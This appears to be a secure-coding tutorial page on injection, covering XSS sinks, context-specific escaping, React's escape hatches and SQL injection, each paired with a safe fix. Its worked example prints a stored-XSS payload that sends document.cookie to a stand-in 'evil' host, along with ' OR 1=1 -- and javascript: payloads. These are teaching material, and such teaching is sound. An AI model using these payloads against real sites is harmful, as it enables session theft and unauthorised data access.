---
title: Where untrusted input becomes code
question: Where can a user's string turn into code I did not write?
order: 1
practise:
  - security-xss-source
  - dom-innerhtml-xss
  - security-sql-injection
sources:
  - author: OWASP
    title: Cross Site Scripting Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
  - author: OWASP
    title: DOM based XSS Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
  - author: OWASP
    title: SQL Injection Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
  - author: OWASP
    title: Cross Site Scripting (XSS)
    url: https://owasp.org/www-community/attacks/xss/
  - author: MDN
    title: Cross-site scripting (XSS)
    url: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS
  - author: MDN
    title: 'Element: innerHTML property'
    url: https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML
  - author: MDN
    title: 'Node: textContent property'
    url: https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent
  - author: MDN
    title: eval()
    url: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval
  - author: MDN
    title: 'javascript: URLs'
    url: https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/javascript
  - author: React
    title: 'Common components (e.g. <div>)'
    url: https://react.dev/reference/react-dom/components/common
  - author: React
    title: Introducing JSX
    url: https://legacy.reactjs.org/docs/introducing-jsx.html
  - author: React
    title: React 19 Upgrade Guide
    url: https://react.dev/blog/2024/04/25/react-19-upgrade-guide
verified: 2026-08-02
---

Many security bugs share one cause: something a user typed gets handed to a program that reads text
as instructions, such as a database, a browser or a JavaScript engine. If that program cannot tell
your text from theirs, theirs runs as if you wrote it. This page is about where that happens in a
web app, and the two ways to stop it.

## The model

**Injection happens when untrusted data reaches an interpreter on the same channel as the code, so
the interpreter parses both as one string and cannot tell which part you wrote.** Name the
interpreter and you have named the vulnerability. Concatenate a value into SQL and it is the SQL
parser. Assign it to `innerHTML` and it is the HTML parser. Pass it to `eval`, or put it after
`javascript:` in a link, and it is the JavaScript engine.

The fix comes in two forms. Either the value travels on a channel of its own, as with parameterised
queries, where OWASP says the database always distinguishes code from data, or it is made
unparseable first. Everything below is one of those two.

### XSS in its three sites

XSS gets an attacker's code to run as though it were part of your site: on your origin, with the
session cookie, the DOM and every API the page may call. The three kinds differ in where the payload
rests before it runs. **Reflected** lives in the link, echoed back in an error message or a search
result, so someone has to click. **Stored** lives in your data, such as a comment field, and the
page hands it to everyone who loads it. **DOM-based** is never rendered by the server: a script in
the page passed something from the URL or the DOM to a sink, so neither the templates nor the
request log shows anything.

Stored XSS is why the database is not a trust boundary: it is the same untrusted input arriving
later, and nothing it passed through inspected it. Validating on the way in is worth doing but
cannot make the output safe, because you do not yet know the context the value lands in.

### The sinks that parse

A grep list. Each takes a string and turns it into something that runs.

- `innerHTML`, `outerHTML` and `insertAdjacentHTML()`. MDN calls `innerHTML` probably the most
  common vector for XSS.
- `document.write()` and `document.writeln()`.
- `eval()`, `new Function`, and `setTimeout` or `setInterval` given a string rather than a function.
- `javascript:` in anything the browser navigates to: an `<a>` `href`, a `<form>` `action`, an
  `<iframe>` `src`, `window.location`.
- `dangerouslySetInnerHTML` in React, which overrides the node's `innerHTML`.

One quirk of `innerHTML` reads as a defence and is not. MDN: "While the property does prevent
`<script>` elements from executing when they are injected, it is susceptible to many other ways that
attackers can craft HTML to run malicious JavaScript."

### The escape depends on the context

MDN says the encoding a value needs depends on the context it is interpolated into.

- **An HTML body**, between tags: the dangerous characters become entities, `<` to `&lt;`, `&` to
  `&amp;`, `"` to `&quot;`, `'` to `&#x27;`.
- **An attribute value**: OWASP calls quoting critical here. Unquoted, a space ends the value.
- **A URL**: percent-encoding, plus a separate check on the scheme, because percent-encoding says
  nothing about `javascript:`.
- **Inside a `<script>`**: OWASP allows one position, a quoted data value, and MDN calls input
  inside `<script>` or `<style>` almost always unsafe.

Hand-escaping loses because you have to be right four ways, at every call site, and one miss is a
breach. `textContent` parses nothing, so there is no encoding decision to get wrong, and OWASP calls
it the most fundamental safe way to put untrusted data in the DOM. A strict Content-Security-Policy,
which [security headers](../headers/security-headers.md) covers, sits behind all of it and catches
the injection you missed.

### React escapes by default, and leaves two doors

React's docs: "By default, React DOM escapes any values embedded in JSX before rendering them." So
`{comment.body}` renders as text whatever it contains. `dangerouslySetInnerHTML` is the first door,
and React warns that untrusted HTML there risks XSS. An interpolated URL is the second, because
escaping never inspects a scheme. React 19 made `javascript:` URLs in `src` and `href` an error, and
nothing outside React checks a scheme for you.

## Worked example

The same input at two layers, sink and fix side by side:

```js
// comment.body is: Nice work<img src=x onerror="fetch('//evil/?c=' + document.cookie)">
el.innerHTML = comment.body; // the parser builds the img, the img fails, the handler runs
el.textContent = comment.body; // characters, and no encoding decision to get wrong

// email is: ' OR 1=1 --
db.query(`SELECT * FROM users WHERE email = '${email}'`); // the SQL parser reads the quote
db.query('SELECT * FROM users WHERE email = ?', [email]); // the value never reaches the parser
```

One bug, two interpreters. The SQL half continues on [the next page](./parameterised-queries.md).
The React cases, in the order they get got wrong:

```jsx
<p>{comment.body}</p>; // escaped by JSX, whatever the string contains
<p dangerouslySetInnerHTML={{ __html: comment.body }} />; // innerHTML with a longer name
<a href={user.website}>Website</a>; // escaped as a string, and the scheme was never checked
```

The href, with the check no amount of escaping can do for you:

```js
const SAFE_SCHEMES = new Set(['http:', 'https:']);

function safeHref(raw) {
  try {
    const url = new URL(raw, window.location.origin); // throws a TypeError on a non-URL
    return SAFE_SCHEMES.has(url.protocol) ? url.href : '#'; // protocol keeps its colon
  } catch {
    return '#';
  }
}
```

## Traps

**The comment shows as `&lt;b&gt;bold&lt;/b&gt;` in the CSV export and still executes on the page.**
It was HTML-encoded once, on the way into the database, which is wrong wherever the output is not
HTML and useless wherever something decodes it again. Store what the user typed, and encode at each
output, where you know which context you are writing into.

**The payload contained no `<script>` tag at all.** It did not need one, and the filter that
stripped `<script>` was aimed at the one thing `innerHTML` already refuses to run. MDN's own example
is `<img src='x' onerror='alert(1)'>`. Event handler attributes are unsafe as a class, so a filter
by tag name is a denylist that loses. Assign to `textContent`, or sanitise with a maintained library
when the requirement is user-authored HTML.

**Nothing in the server logs, nothing in the templates, and a script ran anyway.** The bug is
DOM-based: a script in the page read `location.search`, `location.hash` or an element's own markup
and passed it to a sink. Grep the sink list rather than the templates, and treat every part of the
URL, fragment included, as attacker-supplied.

**The profile link is fine in review and runs script once a user saves one.** The value went into
`href`, and the only defence was escaping, which never looks at the scheme. `javascript:alert(1)`
contains nothing that needs escaping. Parse the URL and allowlist `http:` and `https:`.

**The name renders correctly, and the tooltip attribute breaks out of itself.** The value landed in
an unquoted attribute, so the first space ended it and everything after became new attributes on the
same element, `onmouseover=` included. Quote the attribute, then encode for the attribute context:
the quotes are what make the encoding sufficient.

**The search endpoint crashes on O'Brien.** The same bug, reported as a bug rather than a breach:
the apostrophe closed the string literal and the SQL parser read the rest of the name as syntax. A
query a customer can break by accident is one an attacker can break on purpose. The fix is parameter
binding, which [the next page](./parameterised-queries.md) takes apart.
